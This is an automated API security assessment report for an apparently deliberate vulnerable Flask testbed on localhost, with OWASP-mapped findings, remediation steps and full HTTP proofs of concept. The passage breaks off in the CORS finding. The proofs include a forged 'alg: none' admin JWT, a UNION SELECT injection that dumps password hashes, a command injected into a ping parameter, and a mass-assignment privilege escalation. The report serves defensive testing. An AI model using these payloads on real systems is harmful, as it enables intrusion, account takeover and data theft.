# API Security Assessment & Automated VAPT Report

- **Target URL:** `http://127.0.0.1:5000`
- **Generated:** `2026-11-02 21:32:18`
- **Total Findings:** **16** (Critical: 6, High: 7, Medium: 1, Low: 1, Info: 1)

---

## Vulnerability Findings Summary

| ID | Severity | Category | Title | Endpoint |
|---|---|---|---|---|
| `VAPT-AUTH-001` | **CRITICAL** | API2:2023 - Broken Authentication | JWT Signature Bypass via 'alg: none' Algorithm | `GET / POST / PUT / DELETE ALL Protected Endpoints (e.g. /api/v1/documents/{id})` |
| `VAPT-BOLA-001` | **CRITICAL** | API1:2023 - Broken Object Level Authorization | Broken Object Level Authorization (BOLA) in Document Retrieval | `GET /api/v1/documents/{id}` |
| `VAPT-BFLA-001` | **CRITICAL** | API5:2023 - Broken Function Level Authorization | Broken Function Level Authorization - Unrestricted Admin Access | `GET /api/v1/admin/users` |
| `VAPT-BFLA-002` | **CRITICAL** | API5:2023 - Broken Function Level Authorization | Unauthorized Administrative Database Export Trigger | `POST /api/v1/admin/export-db` |
| `VAPT-SQLI-001` | **CRITICAL** | OWASP API Top 10 - Injection Flaws | SQL Injection in Product Search Parameter ('q') | `GET /api/v1/products/search` |
| `VAPT-CMD-001` | **CRITICAL** | OWASP API Top 10 - Injection Flaws | Remote OS Command Injection in Diagnostic Ping Utility | `GET /api/v1/tools/ping` |
| `VAPT-AUTH-002` | **HIGH** | API2:2023 - Broken Authentication | Weak / Guessable JWT HMAC Secret Key | `POST /api/v1/auth/login` |
| `VAPT-BOLA-002` | **HIGH** | API1:2023 - Broken Object Level Authorization | Broken Object Level Authorization (BOLA) in Order Receipts | `GET /api/v1/orders/{id}` |
| `VAPT-BOLA-003` | **HIGH** | API1:2023 - Broken Object Level Authorization | Insecure Direct Object Reference (IDOR) on User Profile Endpoint | `GET /api/v1/users/{id}/profile` |
| `VAPT-PROP-001` | **HIGH** | API3:2023 - Broken Object Property Level Authorization | Excessive Data Exposure in User Profile Response | `GET /api/v1/users/{id}/profile` |
| `VAPT-PROP-002` | **HIGH** | API3:2023 - Broken Object Property Level Authorization | Mass Assignment Enabling Privilege Escalation | `PUT /api/v1/users/{id}/profile` |
| `VAPT-MISC-001` | **HIGH** | API8:2023 - Security Misconfiguration | Insecure Cross-Origin Resource Sharing (CORS) Policy | `GET / OPTIONS /api/v1/*` |
| `VAPT-MISC-004` | **HIGH** | API8:2023 - Security Misconfiguration | Unauthenticated Debug Configuration Endpoint Disclosed | `GET /api/v1/tools/debug/config` |
| `VAPT-RATE-001` | **MEDIUM** | API4:2023 - Unrestricted Resource Consumption | Missing Rate Limiting on Authentication Endpoint | `POST /api/v1/auth/login` |
| `VAPT-MISC-002` | **LOW** | API8:2023 - Security Misconfiguration | Missing Standard Defense-in-Depth HTTP Security Headers | `ALL Global Headers` |
| `VAPT-MISC-003` | **INFO** | API8:2023 - Security Misconfiguration | Server Technology & Version Fingerprint Disclosure | `ALL Global Headers` |

## Detailed Technical Findings & Proof of Concept

### [VAPT-AUTH-001] JWT Signature Bypass via 'alg: none' Algorithm
- **Severity:** `CRITICAL` (CVSS 9.8)
- **OWASP:** API2:2023 - Broken Authentication
- **CWE:** CWE-347: Improper Verification of Cryptographic Signature
- **Endpoint:** `GET / POST / PUT / DELETE ALL Protected Endpoints (e.g. /api/v1/documents/{id})`

**Description:**
The server's JWT verification implementation accepts unverified tokens with header 'alg': 'none'. This allows unauthenticated external attackers to forge arbitrary tokens with administrative claims (user_id: 4, role: admin) without possessing the cryptographic secret.

**Business Impact:**
Complete compromise of user authentication and tenant isolation. An attacker can impersonate any user, including system administrators, view confidential data, and modify system state.

**Remediation:**
1. Explicitly specify allowed algorithms during verification (e.g., algorithms=['HS256']).
2. Completely disable and reject tokens with 'alg': 'none'.
3. Ensure the JWT library enforces strict cryptographic signature checks on all incoming tokens.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/documents/1 HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI0IiwidXNlcl9pZCI6NCwidXNlcm5hbWUiOiJhZG1pbiIsImVtYWlsIjoiYm9iQGVudGVycHJpc2UtY29ycC5sb2NhbCIsInJvbGUiOiJhZG1pbiIsImlzX2FkbWluIjp0cnVlLCJleHAiOjE3OTM2MjI3MzguNDkzNTMyfQ.

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 264
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "document": {
    "classification": "RESTRICTED",
    "content": "Confidential: Acquisition target TechNova Inc at $45M valuation. Board approved.",
    "created_at": "2026-11-02 16:02:17",
    "id": 1,
    "owner_user_id": 1,
    "title": "Q4 Financial Forecast & M&A Strategy"
  },
  "status": "success"
}
```

---

### [VAPT-BOLA-001] Broken Object Level Authorization (BOLA) in Document Retrieval
- **Severity:** `CRITICAL` (CVSS 8.6)
- **OWASP:** API1:2023 - Broken Object Level Authorization
- **CWE:** CWE-639: Authorization Bypass Through User-Controlled Key
- **Endpoint:** `GET /api/v1/documents/{id}`

**Description:**
The document retrieval endpoint fails to validate whether the requesting authenticated user has authorization to view the requested document. An authenticated attacker (Bob, ID: 2) successfully retrieved confidential M&A strategy documents belonging to Alice (ID: 1) by simply substituting the document ID parameter.

**Business Impact:**
Mass unauthorized data exfiltration. Attackers can iterate through numeric or predictable document identifiers to download all corporate documents, financial records, and confidential assets across all tenants.

**Remediation:**
1. Implement server-side authorization checks comparing the resource owner ID (document.user_id) with the user identity from the verified JWT claims (current_user.id).
2. Implement role-based or attribute-based access control (RBAC/ABAC) policies.
3. Use indirect or non-guessable identifiers (e.g. UUIDv4) in combination with ownership validation.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/documents/1 HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 264
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "document": {
    "classification": "RESTRICTED",
    "content": "Confidential: Acquisition target TechNova Inc at $45M valuation. Board approved.",
    "created_at": "2026-11-02 16:02:17",
    "id": 1,
    "owner_user_id": 1,
    "title": "Q4 Financial Forecast & M&A Strategy"
  },
  "status": "success"
}
```

---

### [VAPT-BFLA-001] Broken Function Level Authorization - Unrestricted Admin Access
- **Severity:** `CRITICAL` (CVSS 8.8)
- **OWASP:** API5:2023 - Broken Function Level Authorization
- **CWE:** CWE-285: Improper Authorization
- **Endpoint:** `GET /api/v1/admin/users`

**Description:**
The administrative endpoint '/api/v1/admin/users' verifies that a token is provided, but fails to enforce role-based access control (RBAC). A low-privileged standard user (Bob) can invoke administrative functions to enumerate all system accounts and user details.

**Business Impact:**
Vertical privilege escalation. Low-privileged users can execute administrative operations, access internal employee databases, and manipulate privileged enterprise resources.

**Remediation:**
1. Implement strict server-side role and permission checks on all administrative endpoints (e.g., ensure user.role == 'admin' and user.is_admin == True).
2. Adopt a centralized authorization policy enforcement point (PEP) or middleware decorator.
3. Return HTTP 403 Forbidden whenever a non-administrative principal attempts access.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/admin/users HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 652
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "status": "success",
  "total_users": 4,
  "users": [
    {
      "created_at": "2026-11-02 16:02:17",
      "credit_balance": 250.0,
      "email": "alice@enterprise-corp.local",
      "id": 1,
      "is_admin": 0,
      "role": "user",
      "username": "alice"
    },
    {
      "created_at": "2026-11-02 16:02:17",
      "credit_balance": 50.0,
      "email": "bob@enterprise-corp.local",
      "id": 2,
      "is_admin": 0,
      "role": "user",
      "username": "bob"
    },
    {
      "created_at": "2026-11-02 16:02:17",
      "credit_balance": 120.0,
      "email": "charlie@enterprise-corp.local",
      "id": 3,
      "is_admin": 0,
      "role": "user",
      "username": "charlie"
    },
    {
      "created_at": "2026-11-02 16:02:17",
      "credit_balance": 9999.0,
      "email": "admin@enterprise-corp.local",
      "id": 4,
      "is_admin": 1,
      "role": "admin",
      "username": "admin"
    }
  ]
}
```

---

### [VAPT-BFLA-002] Unauthorized Administrative Database Export Trigger
- **Severity:** `CRITICAL` (CVSS 8.8)
- **OWASP:** API5:2023 - Broken Function Level Authorization
- **CWE:** CWE-285: Improper Authorization
- **Endpoint:** `POST /api/v1/admin/export-db`

**Description:**
A standard non-administrative user was able to execute the administrative database export routine, allowing unauthorized initiation of full database backups.

**Business Impact:**
Unauthorized data backup generation and full database dump exposure.

**Remediation:**
Enforce administrative authorization checks before triggering backup or export tasks.

**Proof of Concept - HTTP Request:**
```http
POST /api/v1/admin/export-db HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE
Content-Length: 0

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 119
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "archive_url": "/backups/vapt_testbed_backup.sqlite",
  "message": "Database backup archive generated",
  "status": "success"
}
```

---

### [VAPT-SQLI-001] SQL Injection in Product Search Parameter ('q')
- **Severity:** `CRITICAL` (CVSS 9.8)
- **OWASP:** OWASP API Top 10 - Injection Flaws
- **CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- **Endpoint:** `GET /api/v1/products/search`

**Description:**
The product search endpoint formats user-supplied input directly into an SQL query string without parameterization or escaping. By injecting a UNION SELECT query, an unauthenticated attacker extracted the complete database of users, password hashes, and administrative flags.

**Business Impact:**
Complete database exfiltration, unauthorized modification or deletion of data, and potential host takeover depending on database permissions.

**Remediation:**
1. Use parameterized queries (prepared statements) or an Object-Relational Mapper (ORM) for all database queries.
2. Avoid any dynamic string concatenation or formatting inside SQL statements.
3. Implement input validation and apply principle of least privilege to database connections.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/products/search?q=%27+UNION+SELECT+id%2C+username%2C+password_hash%2C+role%2C+email%2C+is_admin+FROM+users+-- HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 1862
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "count": 10,
  "products": [
    {
      "category": "Security",
      "description": "Enterprise-grade hardware firewall with deep packet inspection.",
      "id": 1,
      "name": "SecureGate Hardware Firewall Pro",
      "price": 1299.99,
      "stock": 15
    },
    {
      "category": "a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea",
      "description": 0,
      "id": 1,
      "name": "alice",
      "price": "user",
      "stock": "alice@enterprise-corp.local"
    },
    {
      "category": "Authentication",
      "description": "Hardware USB-C security key supporting WebAuthn and PKI.",
      "id": 2,
      "name": "CryptoKey FIDO2 Security Token",
      "price": 49.99,
      "stock": 150
    },
    {
      "category": "a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea",
      "description": 1,
      "id": 2,
      "name": "bob",
      "price": "admin",
      "stock": "bob_updated@enterprise-corp.local"
    },
    {
      "category": "Software",
      "description": "Web application firewall protection with automated threat blocking.",
      "id": 3,
      "name": "CloudShield WAF License - 1 Year",
      "price": 499.0,
      "stock": 50
    },
    {
      "category": "a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea",
      "description": 0,
      "id": 3,
      "name": "charlie",
      "price": "user",
      "stock": "charlie@enterprise-corp.local"
    },
    {
      "category": "Endpoint",
      "description": "Endpoint detection and continuous posture assessment agent.",
      "id": 4,
      "name": "ZeroTrust Endpoint Agent",
      "price": 15.0,
      "stock": 1000
    },
    {
      "category": "4952bfc2d30557a2cd7cf62e0ea5bc81c1ac9795969cb28c0d1290e7b26d4bd1",
      "description": 1,
      "id": 4,
      "name": "admin",
      "price": "admin",
      "stock": "admin@enterprise-corp.local"
    },
    {
      "category": "Monitoring",
      "description": "Security information and event management collector.",
      "id": 5,
      "name": "ThreatScope SIEM Starter Pack",
      "price": 2499.0,
      "stock": 10
    },
    {
      "category": "Hardware",
      "description": "FIPS 140-2 Level 3 certified Hardware Security Module.",
      "id": 6,
      "name": "Quantum Vault HSM Module",
      "price": 8500.0,
      "stock": 5
    }
  ],
  "query": "' UNION SELECT id, username, password_hash, role, email, is_admin FROM users --",
  "status": "success"
}
```

---

### [VAPT-CMD-001] Remote OS Command Injection in Diagnostic Ping Utility
- **Severity:** `CRITICAL` (CVSS 9.8)
- **OWASP:** OWASP API Top 10 - Injection Flaws
- **CWE:** CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **Endpoint:** `GET /api/v1/tools/ping`

**Description:**
The network diagnostic ping endpoint passes the user-supplied 'host' query parameter directly to the system shell without input sanitization or argument separation. An attacker can append arbitrary system shell commands (e.g. '| echo ...' or '; whoami') which execute with the privileges of the running API server process.

**Business Impact:**
Full Remote Code Execution (RCE) and underlying operating system compromise. An attacker can install persistent malware, read system files, dump credentials, or pivot into the internal corporate network.

**Remediation:**
1. Avoid invoking the operating system shell entirely (shell=False).
2. If external commands must be executed, pass arguments as discrete array elements.
3. Strictly validate input against an allowlist pattern (e.g. valid IPv4/IPv6 address or standard hostname regex).
4. Run the API process in an unprivileged, sandboxed container.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/tools/ping?host=127.0.0.1+%7C+echo+VAPT_CMD_INJECTION_TRIGGERED_SUCCESS HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 221
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "command_executed": "ping -n 1 127.0.0.1 | echo VAPT_CMD_INJECTION_TRIGGERED_SUCCESS",
  "output": "VAPT_CMD_INJECTION_TRIGGERED_SUCCESS\n",
  "status": "success",
  "target": "127.0.0.1 | echo VAPT_CMD_INJECTION_TRIGGERED_SUCCESS"
}
```

---

### [VAPT-AUTH-002] Weak / Guessable JWT HMAC Secret Key
- **Severity:** `HIGH` (CVSS 8.5)
- **OWASP:** API2:2023 - Broken Authentication
- **CWE:** CWE-798: Use of Hard-coded or Weak Cryptographic Credentials
- **Endpoint:** `POST /api/v1/auth/login`

**Description:**
The API signs JSON Web Tokens (HS256) using a weak, dictionary-guessable secret key ('secret123'). Because HS256 is a symmetric signing algorithm, knowledge of the shared secret allows attackers to generate arbitrary valid JWT tokens for any user or administrative account.

**Business Impact:**
Attackers can forge valid authentication tokens at will, bypassing identity verification and gaining full administrative privileges across the API.

**Remediation:**
1. Generate high-entropy, cryptographically random secret keys of at least 256 bits (32+ bytes).
2. Store secrets securely in environment variables or an enterprise secrets manager (e.g. HashiCorp Vault, AWS Secrets Manager).
3. Consider asymmetric signing algorithms such as RS256 or ES256.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/users/4/profile HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0IiwidXNlcl9pZCI6NCwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzX2FkbWluIjp0cnVlLCJleHAiOjE3OTM2Mzg5MzguNTIxNDIxMn0.Ezh_oi9RxtHHoBl5wZ7N6BvTnqPazVsUZdhCzaybelg

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 258
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "created_at": "2026-11-02 16:02:17",
  "credit_balance": 9999.0,
  "email": "admin@enterprise-corp.local",
  "id": 4,
  "is_admin": true,
  "password_hash": "4952bfc2d30557a2cd7cf62e0ea5bc81c1ac9795969cb28c0d1290e7b26d4bd1",
  "role": "admin",
  "ssn_last4": "9999",
  "username": "admin"
}
```

---

### [VAPT-BOLA-002] Broken Object Level Authorization (BOLA) in Order Receipts
- **Severity:** `HIGH` (CVSS 7.7)
- **OWASP:** API1:2023 - Broken Object Level Authorization
- **CWE:** CWE-639: Authorization Bypass Through User-Controlled Key
- **Endpoint:** `GET /api/v1/orders/{id}`

**Description:**
The order details endpoint fails to restrict access to the customer who placed the order. An authenticated user can access another customer's order receipt, order history, and physical shipping address.

**Business Impact:**
Exposure of Personally Identifiable Information (PII) including full delivery addresses, purchase histories, and payment totals, causing severe regulatory and GDPR violations.

**Remediation:**
Validate that order.user_id matches the authenticated user's ID before returning order details. Return HTTP 403 Forbidden or 404 Not Found if unauthorized.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/orders/1 HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 263
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "order": {
    "created_at": "2026-11-02 16:02:17",
    "id": 1,
    "item_name": "MacBook Pro M3 Max 16-inch 64GB",
    "quantity": 1,
    "shipping_address": "742 Evergreen Terrace, Springfield (Private Residence)",
    "status": "DELIVERED",
    "total_amount": 3999.0,
    "user_id": 1
  },
  "status": "success"
}
```

---

### [VAPT-BOLA-003] Insecure Direct Object Reference (IDOR) on User Profile Endpoint
- **Severity:** `HIGH` (CVSS 7.5)
- **OWASP:** API1:2023 - Broken Object Level Authorization
- **CWE:** CWE-639: Authorization Bypass Through User-Controlled Key
- **Endpoint:** `GET /api/v1/users/{id}/profile`

**Description:**
The profile endpoint allows any authenticated user to view the full profile and internal attributes of any other registered user by changing the ID in the URL path.

**Business Impact:**
Account enumeration and unauthorized profiling of users across the enterprise.

**Remediation:**
Restrict access to the logged-in user's own profile or require administrator privileges.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/users/1/profile HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 257
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "created_at": "2026-11-02 16:02:17",
  "credit_balance": 250.0,
  "email": "alice@enterprise-corp.local",
  "id": 1,
  "is_admin": false,
  "password_hash": "a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea",
  "role": "user",
  "ssn_last4": "1122",
  "username": "alice"
}
```

---

### [VAPT-PROP-001] Excessive Data Exposure in User Profile Response
- **Severity:** `HIGH` (CVSS 7.5)
- **OWASP:** API3:2023 - Broken Object Property Level Authorization
- **CWE:** CWE-213: Exposure of Sensitive Information Due to Incompatible Policies
- **Endpoint:** `GET /api/v1/users/{id}/profile`

**Description:**
The API endpoint returns internal and sensitive database fields (password_hash, ssn_last4) in its response payload. While clients might only display public profile details, attackers intercepting HTTP traffic directly extract sensitive credentials and personal data.

**Business Impact:**
Credential exposure. Leaked password hashes can be cracked offline, leading to full account takeover and identity theft.

**Remediation:**
1. Implement strict Data Transfer Objects (DTOs) or response serializers that explicitly whitelist public fields.
2. Never serialize internal database models directly to API JSON responses.
3. Explicitly purge sensitive attributes like password hashes and SSNs.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/users/2/profile HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 252
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "created_at": "2026-11-02 16:02:17",
  "credit_balance": 50.0,
  "email": "bob@enterprise-corp.local",
  "id": 2,
  "is_admin": false,
  "password_hash": "a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea",
  "role": "user",
  "ssn_last4": "3344",
  "username": "bob"
}
```

---

### [VAPT-PROP-002] Mass Assignment Enabling Privilege Escalation
- **Severity:** `HIGH` (CVSS 8.5)
- **OWASP:** API3:2023 - Broken Object Property Level Authorization
- **CWE:** CWE-915: Improperly Controlled Modification of Dynamically Determined Object Attributes
- **Endpoint:** `PUT /api/v1/users/{id}/profile`

**Description:**
The user profile update endpoint binds arbitrary client-supplied JSON parameters directly to database columns without input property validation. A standard user successfully escalated their own role to 'admin' and assigned themselves 999,999 in credit balance.

**Business Impact:**
Privilege escalation and unauthorized balance manipulation. Attackers grant themselves administrative rights and manipulate financial or transactional records.

**Remediation:**
1. Implement strict schema validation and parameter whitelisting for all incoming payloads.
2. Separate user-editable fields (e.g. bio, display name) from internal state fields (role, is_admin, balance).
3. Enforce immutability on sensitive object properties at the API controller layer.

**Proof of Concept - HTTP Request:**
```http
PUT /api/v1/users/2/profile HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE
Content-Length: 109
Content-Type: application/json

{"email": "bob_updated@enterprise-corp.local", "role": "admin", "is_admin": true, "credit_balance": 999999.0}
```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 196
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "message": "Profile updated successfully",
  "status": "success",
  "user": {
    "credit_balance": 999999.0,
    "email": "bob_updated@enterprise-corp.local",
    "id": 2,
    "is_admin": true,
    "role": "admin",
    "username": "bob"
  }
}
```

---

### [VAPT-MISC-001] Insecure Cross-Origin Resource Sharing (CORS) Policy
- **Severity:** `HIGH` (CVSS 7.1)
- **OWASP:** API8:2023 - Security Misconfiguration
- **CWE:** CWE-942: Permissive Cross-Domain Policy with Untrusted Domains
- **Endpoint:** `GET / OPTIONS /api/v1/*`

**Description:**
The API server dynamically reflects arbitrary Origin headers with Access-Control-Allow-Credentials: true (or provides a wildcard '*' policy). This allows malicious websites visited by an authenticated victim to issue cross-origin requests and read sensitive API responses directly.

**Business Impact:**
Cross-Site Data Theft. Attackers can lure authenticated employees to a malicious site and exfiltrate documents, profile information, and private customer data.

**Remediation:**
1. Avoid setting Access-Control-Allow-Origin to '*' on authenticated endpoints.
